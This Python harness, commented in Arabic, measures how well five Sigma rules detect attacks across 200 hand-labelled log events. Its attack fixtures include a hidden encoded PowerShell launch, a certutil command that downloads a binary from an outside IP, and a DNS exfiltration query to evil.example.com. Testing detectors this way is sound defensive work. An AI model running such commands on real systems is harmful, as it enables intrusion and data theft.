"""
لقياس محرّك الكشف: 5 قواعد Sigma مكتوبة يدوياً + 200 حدث مُصنَّف يدوياً.

المنهج (المهم):
    • التصنيف **مكتوب يدوياً قبل التشغيل** في GROUND_TRUTH أدناه — لا يُشتق من نتيجة المحرّك.
    • 6 أحداث هجومية + 4 أحداث حميدة متشابهة عمداً (صعبة) + 190 حدثاً عادياً.
    • نُقاس: precision · recall · false-positive rate · إصابة كل قاعدة.

لماذا 4 حميدة متشابهة: القاعدة السهلة التي لا تُخطئ على بيانات نظيفة لا تُثبت شيئاً.
الصعب هو التمييز بين `powershell -enc` المشروعة وبين المهاجم.
"""
from __future__ import annotations

import json
import sys
from pathlib import Path

HERE = Path(__file__).parent
sys.path.insert(0, str(HERE))

import yaml
import sigma_engine as S

# ------------------------------------------------------------------ القواعد

def w(name: str) -> dict:
    return yaml.safe_load((HERE / "rules" / name).read_text(encoding="utf-8"))


RULES = [w(n) for n in (
    "proc_creation_powershell_encoded.yml",
    "proc_creation_suspicious_parent.yml",
    "proc_creation_lolbin_certutil.yml",
    "network_dns_long_query.yml",
    "logon_bruteforce_pattern.yml",
)]

# --------------------------------------------------- تصنيف يدوي قبل التشغيل
# كل عنصر: (الحدث، التصنيف الحقيقي) — الحميدة المتشابهة موسومة hard_negative
EVENTS: list[tuple[dict, str]] = [
    # ---- هجومية (attack) ----
    ({"EventID": 1, "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
      "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AA==",
      "ParentImage": r"C:\Windows\System32\cmd.exe"}, "attack"),                      # T1059.001
    ({"EventID": 1, "Image": r"C:\Windows\System32\certutil.exe",
      "CommandLine": r"certutil.exe -urlcache -split -f http://203.0.113.9/a.bin a.bin",
      "ParentImage": r"C:\Users\bob\AppData\Local\Temp\x.exe"}, "attack"),             # T1105 LOLBin
    ({"EventID": 1, "Image": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
      "CommandLine": "WINWORD.EXE /n report.docx",
      "ParentImage": r"C:\Users\bob\Downloads\invoice.pdf.exe"}, "attack"),            # T1566
    ({"EventID": 22, "QueryName": "aGVsbG8td29ybGQtdGhpcy1pcy1hLXZlcnktbG9uZy1zdWJkb21haW4tZm9yLWV4ZmlsYXRpb24.evil.example.com",
      "QueryType": "TXT"}, "attack"),                                                   # T1048 DNS exfil
    ({"EventID": 4625, "TargetUserName": "administrator", "IpAddress": "198.51.100.7"}, "attack"),
    ({"EventID": 4625, "TargetUserName": "administrator", "IpAddress": "198.51.100.7"}, "attack"),
    # ---- حميدة متشابهة عمداً (hard_negative) ----
    ({"EventID": 1, "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
      "CommandLine": "powershell.exe -enc SQBFAFgA",   # بلا -nop -w hidden
      "ParentImage": r"C:\Windows\System32\svchost.exe"}, "hard_negative"),
    ({"EventID": 1, "Image": r"C:\Windows\System32\certutil.exe",
      "CommandLine": "certutil.exe -dump",             # استخدام مشروع
      "ParentImage": r"C:\Windows\System32\cmd.exe"}, "hard_negative"),
    ({"EventID": 22, "QueryName": "www.microsoft.com", "QueryType": "A"}, "hard_negative"),
    ({"EventID": 4625, "TargetUserName": "alice", "IpAddress": "203.0.113.50"}, "hard_negative"),
]

# ---- 190 حدثاً عادياً (benign) مُولَّد حتمياً ببذرة ثابتة ----
import random
rng = random.Random(96)
for i in range(190):
    kind = i % 5
    if kind == 0:
        EVENTS.append(({"EventID": 1, "Image": r"C:\Windows\System32\svchost.exe",
                        "CommandLine": f"svchost.exe -k netsvcs -p -s {rng.randint(1,900)}",
                        "ParentImage": r"C:\Windows\System32\services.exe"}, "benign"))
    elif kind == 1:
        EVENTS.append(({"EventID": 4624, "TargetUserName": f"user{rng.randint(1,40)}",
                        "IpAddress": f"10.0.{rng.randint(0,255)}.{rng.randint(1,254)}"}, "benign"))
    elif kind == 2:
        EVENTS.append(({"EventID": 22, "QueryName": f"api{rng.randint(1,99)}.internal.corp",
                        "QueryType": "A"}, "benign"))
    elif kind == 3:
        EVENTS.append(({"EventID": 11, "TargetFilename": f"C:\\Users\\bob\\Documents\\file{rng.randint(1,99)}.docx"}, "benign"))
    else:
        EVENTS.append(({"EventID": 1, "Image": r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                        "CommandLine": f"chrome.exe --profile-directory=Default --tab={rng.randint(1,50)}",
                        "ParentImage": r"C:\Windows\explorer.exe"}, "benign"))


def run() -> int:
    print("=" * 74)
    print("مختبر الكشف — Sigma حقيقي على أحداث موسومة يدوياً")
    print("=" * 74)

    # 1) فحص بنيوي
    print("\n[1] lint على القواعد الخمس:")
    ok = True
    for r in RULES:
        errs = S.lint(r)
        if errs:
            ok = False
            print(f"  ✗ {r.get('title')}: {errs}")
        else:
            print(f"  ✓ {r.get('id')} — {r.get('title')}")

    # 2) هل يرفض المحرّك قاعدة ناقصة؟ (الاختبار الذي كان يفشل سابقاً)
    print("\n[2] هل يرفض قاعدة فيها title فقط؟")
    bad = S.lint({"title": "X"})
    print(f"  {'✓' if bad else '✗'} رُفضت بـ{len(bad)} خطأ: {bad[:2]}")
    if not bad:
        ok = False

    # 3) تقييم
    print(f"\n[3] تقييم {len(EVENTS)} حدثاً × {len(RULES)} قواعد:")
    res = S.evaluate(RULES, [e for e, _ in EVENTS])
    fired = {h["event_index"] for h in res["hits"]}
    if res["errors"]:
        print(f"  ✗ أخطاء تنفيذ: {res['errors'][:3]}")
        ok = False

    tp = fp = fn = tn = 0
    per_rule: dict[str, int] = {}
    for i, (_, label) in enumerate(EVENTS):
        attacked = label in ("attack", "hard_negative") and label == "attack"
        flagged = i in fired
        if attacked and flagged:
            tp += 1
        elif attacked and not flagged:
            fn += 1
        elif not attacked and flagged:
            fp += 1
        else:
            tn += 1
    for h in res["hits"]:
        per_rule[h["rule_id"]] = per_rule.get(h["rule_id"], 0) + 1

    precision = tp / (tp + fp) * 100 if (tp + fp) else 0.0
    recall = tp / (tp + fn) * 100 if (tp + fn) else 0.0
    fpr = fp / (fp + tn) * 100 if (fp + tn) else 0.0
    f1 = 2 * precision * recall / (precision + recall) if (precision + recall) else 0.0

    print(f"  إصابات: {len(res['hits'])} · مرات الإطلاق لكل قاعدة:")
    for rid, n in sorted(per_rule.items(), key=lambda x: -x[1]):
        print(f"    {rid:52s} {n:3d}")

    print(f"\n  ┌{'─'*46}")
    print(f"  │ حقيقي موجب  TP = {tp:3d}   │ حقيقي سالب  TN = {tn:3d}")
    print(f"  │ موجب كاذب   FP = {fp:3d}   │ سالب كاذب   FN = {fn:3d}")
    print(f"  ├{'─'*46}")
    print(f"  │ Precision = {precision:5.1f}%   Recall = {recall:5.1f}%")
    print(f"  │ F1        = {f1:5.1f}%   معدل الإيجاب الكاذب = {fpr:4.1f}%")
    print(f"  └{'─'*46}")

    # 4) شرط النجاح المعلن مسبقاً
    print("\n[4] شرط النجاح (معلن قبل التشغيل):")
    cond = [("precision = 100%", precision == 100.0),
            ("recall ≥ 80%", recall >= 80.0),
            ("معدل إيجاب كاذب = 0%", fpr == 0.0),
            ("رفض القاعدة الناقصة", bool(bad))]
    for name, passed in cond:
        print(f"  {'✓' if passed else '✗'} {name}")
        ok = ok and passed

    out = {"tp": tp, "fp": fp, "fn": fn, "tn": tn,
           "precision": round(precision, 1), "recall": round(recall, 1),
           "f1": round(f1, 1), "fpr": round(fpr, 1),
           "hits_per_rule": per_rule, "passed": ok,
           "events": len(EVENTS), "rules": len(RULES)}
    (HERE / "detection_result.json").write_text(json.dumps(out, indent=2, ensure_ascii=False), encoding="utf-8")
    print(f"\n{'✅ اجتاز' if ok else '❌ لم يجتز'} — النتيجة في detection_result.json")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(run())
